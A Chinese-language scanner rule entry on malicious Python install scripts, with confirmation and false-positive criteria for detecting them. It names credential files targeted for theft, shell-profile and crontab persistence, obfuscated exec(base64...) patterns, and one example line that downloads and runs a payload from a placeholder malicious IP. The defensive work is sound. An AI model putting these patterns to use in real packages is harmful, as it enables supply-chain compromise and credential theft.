---
cwe_id: ["CWE-506", "CWE-94"]
name: "Malicious_Setup_Scripts"
domain: ["Infra_Supply_Expert", "General_Expert"]
---

#### 1. 漏洞机制
攻击者在 Python 依赖包的安装脚本（如 `setup.py`）或模块初始化文件（如 `__init__.py`）中隐蔽注入恶意载荷，当受害者或 CI/CD 流水线执行 `pip install` 等安装/构建过程时，恶意代码会直接在宿主系统上以当前用户权限静默执行，导致敏感凭证窃取、后门植入或远程代码执行（RCE）。

#### 2. 漏洞配置与代码特征 (Vulnerability Configuration Patterns)

##### 1. 配置载体与上下文 (Configuration Carrier & Context)
主要存在于 Python 项目的打包、构建与安装入口文件中，最典型的是 `setup.py`，也可能出现在由 `pyproject.toml` 定制化构建钩子调用的外部脚本，以及被自动加载的包根目录 `__init__.py` 中。此漏洞直接威胁执行依赖安装的任何运行环境，包括开发者本机、容器内部环境以及自动化 CI/CD 构建节点。

##### 2. 危险配置与边界暴露 (Insecure Configuration & Boundary Exposure)
攻击者通常通过继承并重写 `setuptools.command.install.install` 或 `setuptools.command.develop.develop` 类来劫持默认安装生命周期。
在代码特征上，表现为打破了代码构建与系统操作的边界：
1. 滥用 `os.system`、`os.popen` 或 `subprocess` 执行任意 Shell 脚本；
2. 使用 `urllib` 或 `requests` 发起向未知第三方服务器的异常外连（用于下载二阶段木马或外送环境变量）；
3. 大量使用 `eval()`、`exec()` 配合 `base64`、`zlib` 等手段对真实的恶意 Payload 进行混淆编码以绕过静态检测。

##### 3. 缺失的基线与信任校验 (Missing Baseline & Trust Validation)
1. 在供应链安全防御基线中，缺失对第三方依赖源的强校验机制：如未使用 `requirements.txt` 中的 `--require-hashes` 锁定版本哈希；
2. 在系统架构层面，缺失构建环境（Build Environment）的网络出站隔离（Egress Filtering），允许安装脚本自由访问外部公网；
3. 缺失最小权限原则，即在容器或 CI 平台中使用 root 用户执行依赖安装，未剥夺对宿主机敏感目录的读写权限。

#### 3. 典型误报样例

1. **合法的 C/C++/Rust 扩展编译**：包含底层加速扩展的 Python 库，在 `setup.py` 中合法使用 `subprocess` 调用 `gcc`、`make`、`cmake` 或 `cargo` 命令进行本地源码编译。
2. **合法的数据/模型预拉取**：部分数据科学、NLP 库在安装或首次 `import` 时，合法发起网络请求，从受信任的官方数据源（如 HuggingFace、AWS S3 官方桶）下载预训练权重、分词器词表、NLTK 语料库等。
3. **合法的环境初始化脚本**：开发辅助工具或 CLI 程序的后置安装脚本，用于在特定的应用配置目录（如 `~/.config/appname/`）初始化默认配置文件，或向系统的 `PATH` 目录创建快捷软链接。

#### 4. 证实标准

若扫描器命中目标代码（特别是 `setup.py` 内部或重写的 `install` 方法），且代码包含以下任一高危行为特征，即可证实为恶意脚本：
1. **存在高度混淆与反分析特征**：硬编码了极长的不可读字符串，并使用 `eval`、`exec`、`getattr` 解码执行（如 `exec(base64.b64decode(b'...'))`）。
2. **窃取系统关键凭证或环境变量**：脚本中显式包含读取并试图外发敏感文件的逻辑，目标直指 `~/.ssh/id_rsa`、`~/.aws/credentials`、`/etc/passwd`、`~/.kube/config` 或遍历读取系统级环境变量（如各种 `TOKEN`、`SECRET`）。
3. **未授权的恶意网络外连**：向非开源软件官方、信誉低下的第三方域名、纯 IP 地址、或 Pastebin/Ngrok 等匿名服务发起网络请求，且往往伴随将请求响应直接管道化执行的逻辑（如 `os.system(urllib.request.urlopen("http://恶意IP/载荷").read())`）。
4. **危险的系统级持久化篡改**：尝试修改用户的 `.bashrc`、`.zshrc` 等 Shell 配置文件，或者向系统注入 `crontab` 定时任务以实现后门持久化。

#### 5. 证伪标准

若目标代码触发了执行命令或网络请求的扫描规则，但同时满足以下**所有**条件，则研判为误报并予以证伪：
1. **行为透明无混淆**：代码逻辑清晰，所有被执行的系统命令、URL 地址均以明文形式存在，未采用任何 Base64、Hex、zlib 或自定义加密手段隐藏真实意图。
2. **外部调用限定于标准构建链**：通过 `subprocess` 等调用的命令严格局限于标准的系统级编译与构建工具集（如 `gcc`, `g++`, `swig`, `pkg-config`），且参数安全，不存在命令拼接注入。
3. **网络请求指向受信实体**：网络外连的 URL 明确归属于该项目自身的官方代码仓库（如 `github.com/官方组织/...`）或公认的可信平台（如 `huggingface.co`），且往往包含哈希完整性校验逻辑。
4. **文件操作沙箱化**：涉及的文件创建与修改行为，被严格限制在该依赖包自身的安装路径内、系统的标准化临时目录（如 `/tmp/`、`tempfile` 模块生成的路径）下，未发生跨目录的非授权读写。